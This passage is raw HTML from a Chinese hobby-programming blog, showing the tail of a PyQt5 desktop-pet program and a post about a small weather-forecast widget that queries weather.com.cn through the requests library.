                   self.heading = <span class="number">0</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.move(self.x, self.y)</span><br><span class="line">                    self.setImage(self.action_images[self.action_pointer].mirrored(<span class="number">0</span>, <span class="literal">False</span>))</span><br><span class="line">                    self.action_pointer += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> (self.heading == <span class="number">0</span>):</span><br><span class="line">                <span class="keyword">if</span> ((self.x &lt;= <span class="number">0</span> <span class="keyword">and</span> self.heading == <span class="number">1</span>) <span class="keyword">or</span> (</span><br><span class="line">                        self.x &gt;= screenRect.width() - self.size().width() <span class="keyword">and</span> self.heading == <span class="number">0</span>)):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;now is hit wall&#x27;</span>)</span><br><span class="line">                    x = self.pos().x()</span><br><span class="line">                    x += <span class="built_in">int</span>(<span class="number">32</span>)</span><br><span class="line">                    self.action_images = self.pet_images[<span class="number">12</span>]</span><br><span class="line">                    self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">                    self.action_pointer = <span class="number">0</span></span><br><span class="line">                    self.hitwall()</span><br><span class="line">                    self.fallingBody()</span><br><span class="line">                    self.heading = <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.move(self.x, self.y)</span><br><span class="line">                    self.setImage(self.action_images[self.action_pointer].mirrored(<span class="number">0</span>, <span class="literal">False</span>))</span><br><span class="line">                    self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;设置当前显示的图片&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setImage</span>(<span class="params">self, image</span>):</span></span><br><span class="line">        self.image.setPixmap(QPixmap.fromImage(image))</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;随机导入一个桌面宠物的所有图片&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">randomLoadPetImages</span>(<span class="params">self</span>):</span></span><br><span class="line">        cfg = self.cfg</span><br><span class="line">        pet_name = random.choice(<span class="built_in">list</span>(cfg.PET_ACTIONS_MAP.keys()))</span><br><span class="line">        actions = cfg.PET_ACTIONS_MAP[pet_name]</span><br><span class="line">        pet_images = []</span><br><span class="line">        self.flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> action <span class="keyword">in</span> actions:</span><br><span class="line">            patch = [self.loadImage(os.path.join(cfg.ROOT_DIR, pet_name, <span class="string">&#x27;shime&#x27;</span>+item+<span class="string">&#x27;.png&#x27;</span>)) <span class="keyword">for</span> item <span class="keyword">in</span> action]</span><br><span class="line">            pet_images.append(patch)</span><br><span class="line">        iconpath = os.path.join(cfg.ROOT_DIR, pet_name, <span class="string">&#x27;shimeX.png&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> pet_images, iconpath</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;鼠标左右键功能&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mousePressEvent</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        <span class="keyword">if</span> event.button() == Qt.LeftButton:</span><br><span class="line">            self.InitTimer(self.dragging,<span class="number">80</span>)</span><br><span class="line">            self.is_follow_mouse = <span class="literal">True</span></span><br><span class="line">            self.mouse_drag_pos = event.globalPos() - self.pos()</span><br><span class="line">            event.accept()</span><br><span class="line">            self.setCursor(QCursor(Qt.OpenHandCursor))</span><br><span class="line">        <span class="keyword">elif</span> event.button() == Qt.RightButton:</span><br><span class="line">            self.InitTimer(self.uncomfortable,<span class="number">80</span>)</span><br><span class="line">            self.menu = QMenu(self)</span><br><span class="line">            self.weather = self.menu.addAction(<span class="string">&quot;天气预报&quot;</span>)</span><br><span class="line">            self.crawler = self.menu.addAction(<span class="string">&quot;启动爬虫&quot;</span>)</span><br><span class="line">            self.music = self.menu.addAction(<span class="string">&quot;网易云API&quot;</span>)</span><br><span class="line">            self.imagebox = self.menu.addAction(<span class="string">&quot;图片盒子&quot;</span>)</span><br><span class="line">            self.quitA = self.menu.addAction(<span class="string">&quot;退出附属程序&quot;</span>)</span><br><span class="line">            self.quit = self.menu.addAction(<span class="string">&quot;退出桌宠&quot;</span>)</span><br><span class="line">            self.choice = self.menu.exec_(self.mapToGlobal(event.pos()))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (self.choice == self.weather):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;weather&quot;</span>)</span><br><span class="line">                self.weatherGet()</span><br><span class="line">            <span class="keyword">if</span> (self.choice == self.crawler):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;crawler&quot;</span>)</span><br><span class="line">                self.crawlerStart()</span><br><span class="line">            <span class="keyword">if</span> (self.choice == self.music):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;music&quot;</span>)</span><br><span class="line">                self.Netease()</span><br><span class="line">            <span class="keyword">if</span> (self.choice == self.imagebox):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;imagebox&quot;</span>)</span><br><span class="line">                self.imageBox()</span><br><span class="line">            <span class="keyword">if</span> (self.choice == self.quitA):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;quitA&quot;</span>)</span><br><span class="line">                self.quitAttached()</span><br><span class="line">            <span class="keyword">if</span> (self.choice == self.quit):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;quit&quot;</span>)</span><br><span class="line">                self.quitPet()</span><br><span class="line"></span><br><span class="line">            self.randomAct()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;鼠标移动, 则宠物也移动&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mouseMoveEvent</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        <span class="keyword">if</span> Qt.LeftButton <span class="keyword">and</span> self.is_follow_mouse:</span><br><span class="line">            self.move(event.globalPos() - self.mouse_drag_pos)</span><br><span class="line">            event.accept()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;鼠标释放时, 取消绑定&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mouseReleaseEvent</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        self.is_follow_mouse = <span class="literal">False</span></span><br><span class="line">        self.setCursor(QCursor(Qt.ArrowCursor))</span><br><span class="line">        self.fallingBody()</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;宠物自由落体&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fallingBody</span>(<span class="params">self</span>):</span></span><br><span class="line">        x = self.pos().x()</span><br><span class="line">        y = self.pos().y()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;x=%x : y=%x&quot;</span> %(x,y))</span><br><span class="line">        self.InitTimer(self.fall,<span class="number">25</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;导入图像&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loadImage</span>(<span class="params">self, imagepath</span>):</span></span><br><span class="line">        image = QImage()</span><br><span class="line">        image.load(imagepath)</span><br><span class="line">        <span class="keyword">return</span> image</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;随机到一个屏幕上的某个位置&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">randomPosition</span>(<span class="params">self</span>):</span></span><br><span class="line">        screen_geo = QDesktopWidget().screenGeometry()</span><br><span class="line">        pet_geo = self.geometry()</span><br><span class="line">        width = (screen_geo.width() - pet_geo.width()) * random.random()</span><br><span class="line">        height = (screen_geo.height() - pet_geo.height()) * random.random()</span><br><span class="line">        self.move(<span class="built_in">int</span>(width), <span class="built_in">int</span>(height))</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;天气预报&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">weatherGet</span>(<span class="params">self</span>):</span></span><br><span class="line">        wea.show()</span><br><span class="line">        self.fallingBody()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;启动爬虫&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">crawlerStart</span>(<span class="params">self</span>):</span></span><br><span class="line">        pets.close()</span><br><span class="line">        cra.Start()</span><br><span class="line">        pets.show()</span><br><span class="line">        self.fallingBody()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Netease</span>(<span class="params">self</span>):</span></span><br><span class="line">        mus.show()</span><br><span class="line">        self.fallingBody()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;图片盒子&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">imageBox</span>(<span class="params">self</span>):</span></span><br><span class="line">        box.show()</span><br><span class="line">        self.fallingBody()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;退出附属程序&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quitAttached</span>(<span class="params">self</span>):</span></span><br><span class="line">        wea.close()</span><br><span class="line">        box.close()</span><br><span class="line">        mus.close()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Everything is done!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;退出桌宠&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quitPet</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.close()</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    pets = DesktopPet()</span><br><span class="line">    wea = Mainweather()</span><br><span class="line">    mus = Netease()</span><br><span class="line">    palette = QPalette()</span><br><span class="line">    palette.setBrush(QPalette.Background, QBrush(QPixmap(<span class="string">&quot;D:\PythonProject\images\YHellow.png&quot;</span>)))</span><br><span class="line">    wea.setPalette(palette)</span><br><span class="line">    mus.setPalette(palette)</span><br><span class="line">    cra = Crawler()</span><br><span class="line">    box = MainBOX()</span><br><span class="line">    pets.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure>
<p>更新日志：</p>
<ul>
<li>version：v2.1</li>
<li>date：2022.5.20</li>
<li>type：<ul>
<li>Features：<ul>
<li>新添右键功能：网易云API</li>
</ul>
</li>
<li>Changed：NULL</li>
<li>Removed：NULL</li>
</ul>
</li>
<li>desc：<ul>
<li>以我的技术，感觉已经到极限了，可能会有好长一段时间都不会更新了</li>
</ul>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/13/%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/13/%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5/" class="post-title-link" itemprop="url">不务正业系列：天气预报（偶尔更新）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-05-13 18:11:32 / Modified: 20:07:40" itemprop="dateCreated datePublished" datetime="2022-05-13T18:11:32+08:00">2022-05-13</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/NoMaoWork/" itemprop="url" rel="index"><span itemprop="name">NoMaoWork</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>9.1k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="天气预报"><a href="#天气预报" class="headerlink" title="天气预报"></a>天气预报</h2><p>这是一个小项目，就是某本书上的一个例题</p>
<p>原理为：</p>
<ul>
<li>requests 获取中国天气官网地址的 web API</li>
<li>使用 Python 进行打印</li>
</ul>
<p>样例代码为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">rep=requests.get(<span class="string">&#x27;http://www.weather.com.cn/data/sk/101270101.html&#x27;</span>) <span class="comment"># 成都,101270101</span></span><br><span class="line"></span><br><span class="line">rep.encoding=<span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;返回结果: %s&#x27;</span> % rep.json() )</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;城市: %s&#x27;</span> %rep.json()[<span class="string">&#x27;weatherinfo&#x27;</span>][<span class="string">&#x27;city&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;风向: %s&#x27;</span> % rep.json()[<span class="string">&#x27;weatherinfo&#x27;</span>][<span class="string">&#x27;WD&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;温度: %s&#x27;</span> % rep.json()[<span class="string">&#x27;weatherinfo&#x27;</span>][<span class="string">&#x27;temp&#x27;</span>]+ <span class="string">&quot; 度&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;风力: %s&#x27;</span> % rep.json()[<span class="string">&#x27;weatherinfo&#x27;</span>][<span class="string">&#x27;WS&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;湿度: %s&#x27;</span> % rep.json()[<span class="string">&#x27;weatherinfo&#x27;</span>][<span class="string">&#x27;SD&#x27;</span>])</span><br></pre></td></tr></table></figure>
<h2 id="CallWeatherWin-V1-0"><a href="#CallWeatherWin-V1-0" class="headerlink" title="CallWeatherWin_V1.0"></a>CallWeatherWin_V1.0</h2><p>这个小程序是为了桌宠写的，我会把它添加到桌宠的右键菜单中</p>
<img src="/2022/05/13/%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5/1652436461986-1652443659509.png" class width="1652436461986"> 
<p>目前只添加了两个城市，如果有需要可以在网上搜索城市代码，自行添加</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PyQt5 <span class="keyword">import</span> QtCore, QtGui, QtWidgets</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtCore <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mainweather</span>(<span class="params">QWidget</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,parent=<span class="literal">None</span>,**kwargs</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(Mainweather, self).__init__(parent)</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> kwargs.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(self.cfg, key): <span class="built_in">setattr</span>(self.cfg, key, value)</span><br><span class="line">        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint | Qt.SubWindow)</span><br><span class="line">        self.ui = UI_Form()</span><br><span class="line">        self.ui.setupUI(self)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">queryWeather</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;* queryWeather &#x27;</span>)</span><br><span class="line">        cityName = self.ui.weatherComboBox.currentText()</span><br><span class="line">        cityCode = self.transCityName(cityName)</span><br><span class="line"></span><br><span class="line">        rep = requests.get(<span class="string">&#x27;http://www.weather.com.cn/data/sk/&#x27;</span>+cityCode+<span class="string">&#x27;.html&#x27;</span>)</span><br><span class="line">        rep.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(rep.json())</span><br><span class="line"></span><br><span class="line">        msg1 = (<span class="string">&#x27;城市: %s&#x27;</span> % rep.json()[<span class="string">&#x27;weatherinfo&#x27;</span>][<span class="string">&#x27;city&#x27;</span>])+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        msg2 = (<span class="string">&#x27;风向: %s&#x27;</span> % rep.json()[<span class="string">&#x27;weatherinfo&#x27;</span>][<span class="string">&#x27;WD&#x27;</span>])+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        msg3 = (<span class="string">&#x27;温度: %s&#x27;</span> % rep.json()[<span class="string">&#x27;weatherinfo&#x27;</span>][<span class="string">&#x27;temp&#x27;</span>] + <span class="string">&quot; 度&quot;</span>)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        msg4 = (<span class="string">&#x27;风力: %s&#x27;</span> % rep.json()[<span class="string">&#x27;weatherinfo&#x27;</span>][<span class="string">&#x27;WS&#x27;</span>])+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        msg5 = (<span class="string">&#x27;湿度: %s&#x27;</span> % rep.json()[<span class="string">&#x27;weatherinfo&#x27;</span>][<span class="string">&#x27;SD&#x27;</span>])+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">        result = msg1+msg2+msg3+msg4+msg5</span><br><span class="line">        self.ui.resultText.setText(result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">transCityName</span>(<span class="params">self,cityName</span>):</span></span><br><span class="line">        cityCode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> cityName == <span class="string">&#x27;成都&#x27;</span>:</span><br><span class="line">            cityCode = <span class="string">&#x27;101270101&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> cityName == <span class="string">&#x27;南充&#x27;</span>:</span><br><span class="line">            cityCode = <span class="string">&#x27;101270501&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> cityCode</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clearResult</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;* clearResult &#x27;</span>)</span><br><span class="line">        self.ui.resultText.clear()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quitWindows</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;* quitWindows &#x27;</span>)</span><br><span class="line">        result = <span class="string">&quot;由于本项目不完善,请右键桌宠进行关闭&quot;</span></span><br><span class="line">        self.ui.resultText.setText(result)</span><br><span class="line">        self.close()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UI_Form</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setupUI</span>(<span class="params">self,Form</span>):</span></span><br><span class="line">        Form.setObjectName(<span class="string">&quot;Form&quot;</span>)</span><br><span class="line">        Form.resize(<span class="number">450</span>,<span class="number">350</span>)</span><br><span class="line"></span><br><span class="line">        self.groupBox = QtWidgets.QGroupBox(Form)</span><br><span class="line">        self.groupBox.setGeometry(QtCore.QRect(<span class="number">10</span>,<span class="number">10</span>,<span class="number">431</span>,<span class="number">251</span>))</span><br><span class="line">        self.groupBox.setObjectName(<span class="string">&quot;groupBox&quot;</span>)</span><br><span class="line">        self.weatherComboBox = QtWidgets.QComboBox(self.groupBox)</span><br><span class="line">        self.weatherComboBox.setGeometry(QtCore.QRect(<span class="number">80</span>,<span class="number">30</span>,<span class="number">221</span>,<span class="number">21</span>))</span><br><span class="line">        self.weatherComboBox.addItem(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        self.weatherComboBox.addItem(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        self.resultText = QtWidgets.QTextEdit(self.groupBox)</span><br><span class="line">        self.resultText.setGeometry(QtCore.QRect(<span class="number">10</span>,<span class="number">60</span>,<span class="number">411</span>,<span class="number">181</span>))</span><br><span class="line">        self.resultText.setObjectName(<span class="string">&quot;resultText&quot;</span>)</span><br><span class="line">        self.label = QtWidgets.QLabel(self.groupBox)</span><br><span class="line">        self.label.setGeometry(QtCore.QRect(<span class="number">20</span>,<span class="number">20</span>,<span class="number">72</span>,<span class="number">21</span>))</span><br><span class="line">        self.label.setObjectName(<span class="string">&quot;laber&quot;</span>)</span><br><span class="line">        self.okButton = QtWidgets.QPushButton(Form)</span><br><span class="line">        self.okButton.setGeometry(QtCore.QRect(<span class="number">50</span>,<span class="number">300</span>,<span class="number">93</span>,<span class="number">28</span>))</span><br><span class="line">        self.okButton.setObjectName(<span class="string">&quot;okButton&quot;</span>)</span><br><span class="line">        self.clearButton = QtWidgets.QPushButton(Form)</span><br><span class="line">        self.clearButton.setGeometry(QtCore.QRect(<span class="number">160</span>,<span class="number">300</span>,<span class="number">93</span>,<span class="number">28</span>))</span><br><span class="line">        self.clearButton.setObjectName(<span class="string">&quot;clearButton&quot;</span>)</span><br><span class="line">        self.quitButton = QtWidgets.QPushButton(Form)</span><br><span class="line">        self.quitButton.setGeometry(QtCore.QRect(<span class="number">270</span>,<span class="number">300</span>,<span class="number">93</span>,<span class="number">28</span>))</span><br><span class="line">        self.quitButton.setObjectName(<span class="string">&quot;quitButton&quot;</span>)</span><br><span class="line"></span><br><span class="line">        self.retranslateUI(Form)</span><br><span class="line">        self.okButton.clicked.connect(Form.queryWeather)</span><br><span class="line">        self.clearButton.clicked.connect(Form.clearResult)</span><br><span class="line">        self.quitButton.clicked.connect(Form.quitWindows)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#QtCore.QMetaObject.connectSlotsByName(Form)</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">retranslateUI</span>(<span class="params">self,Form</span>):</span></span><br><span class="line">        _translate = QtCore.QCoreApplication.translate</span><br><span class="line">        Form.setWindowTitle(_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;天气预报&quot;</span>))</span><br><span class="line"></span><br><span class="line">        self.groupBox.setTitle(_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;查询城市天气&quot;</span>))</span><br><span class="line">        self.weatherComboBox.setItemText(<span class="number">0</span>,_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;成都&quot;</span>))</span><br><span class="line">        self.weatherComboBox.setItemText(<span class="number">1</span>,_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;南充&quot;</span>))</span><br><span class="line">        self.label.setText(_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;城市&quot;</span>))</span><br><span class="line">        self.okButton.setText(_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;查询&quot;</span>))</span><br><span class="line">        self.clearButton.setText(_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;清空&quot;</span>))</span><br><span class="line">        self.quitButton.setText(_translate(<span class="string">&quot;Form&quot;</span>,<span class="string">&quot;退出&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    win = Mainweather()</span><br><span class="line">    win.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure>
<p>更新日志：</p>
<ul>
<li><p>version：v1.0</p>
</li>
<li><p>date：2022.5.12</p>
</li>
<li><p>type：</p>
<ul>
<li>Features：NULL</li>
<li>Changed：NULL</li>
<li>Removed：NULL</li>
</ul>
</li>
<li><p>desc：</p>
<ul>
<li>第一代版本，后续考虑添加更换壁纸的功能</li>
</ul>
</li>
</ul>
<h2 id="CallWeatherWin-V1-1"><a href="#CallWeatherWin-V1-1" class="headerlink" title="CallWeatherWin_V1.1"></a>CallWeatherWin_V1.1</h2><p>第二代版本主要是进行了美化操作，功能没有太大改变</p>
<img src="/2022/05/13/%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5/1652443286512.png" class width="1652443286512"> 
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span 